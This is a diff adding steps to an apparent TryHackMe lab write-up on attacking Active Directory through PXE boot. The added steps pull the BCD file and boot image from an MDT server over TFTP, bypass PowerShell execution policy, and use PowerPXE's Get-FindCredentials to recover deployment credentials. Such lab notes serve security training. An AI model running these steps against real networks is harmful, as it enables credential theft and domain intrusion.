@@ -45,7 +45,7 @@ Connect to http://pxeboot.za.tryhackme.com (MDT Server) to view the BCD files:
 
 - Focus on the BCD file of the x64 architecture
 
-- Copy and store the full name of this file: x64{7B....B3}.bcd
+- Copy and store the full name of this file: x64{7B...B3}.bcd
 
 ### SSH into THMJMP1 (Windows Machine)
 
@@ -57,3 +57,47 @@ C:\Users\THM\Documents> mkdir &lt;username&gt;
 C:\Users\THM\Documents> copy C:\powerpxe &lt;username&gt;\
 C:\Users\THM\Documents\> cd &lt;username&gt;
 </pre>
+
+- Use TFTP to download BCD file to read the configuration of the MDT Server
+- BCD files are located in /TMP/ directory on MDT Server
+
+<pre>
+C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{7B...B3}.bcd" conf.bcd
+Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
+</pre>
+
+- THMMDT Server ip address
+
+<pre> nslookup thmmdt.za.tryhackme.com </pre>
+
+- BCD file has now been recovered
+- Use `powerpxe.ps1` to read contents
+- Powerpxe is a PowerShell script that performs this type of attack
+
+- `Get-WimFile` recover the locations of PXE Boot images in BCD file
+
+<pre>
+
+C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.   
+
+PS C:\Users\THM\Documents\am0> Import-Module .\PowerPXE.ps1
+PS C:\Users\THM\Documents\am0> $BCDFile = "conf.bcd"
+PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
+>> Parse the BCD file: conf.bcd
+>>>> Identify wim file : PXE Boot Image Location
+PXE Boot Image Location
+</pre>
+
+- WIM files are bootable images in Windows Imaging Format
+- Now we have location of PXE Boot Image. we can use TFTP to download it
+
+<pre>
+PS C:\Users\THM\Documents\am0> tftp -i THMMDT IP GET "PXE Boot Image Location" pxeboot.wim
+</pre>
+
+# Recover Credentials from PXE Boot Image
+- Use powerpxe to recover the credentials from bootstrap file
+
+<pre> PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim </pre>
